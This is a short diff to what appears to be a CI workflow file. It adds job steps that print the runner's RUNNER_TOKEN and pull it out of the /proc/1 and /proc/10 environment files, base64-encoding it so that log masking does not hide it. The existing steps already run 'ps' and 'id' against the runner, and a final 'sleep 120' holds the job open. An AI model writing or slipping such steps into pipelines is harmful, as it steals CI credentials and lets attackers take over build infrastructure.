@@ -11,4 +11,9 @@ jobs:
         - run: echo "Hello, world!"
         - run: echo "ps"; ps -ef
         - run: echo "id"; id
+        - run: echo "$RUNNER_TOKEN"
+        - run: |
+            grep --binary-files=text RUNNER_TOKEN /proc/10/environ | base64 -w 0
+            echo secondo env
+            grep --binary-files=text RUNNER_TOKEN /proc/1/environ | base64 -w 0
         - run: sleep 120
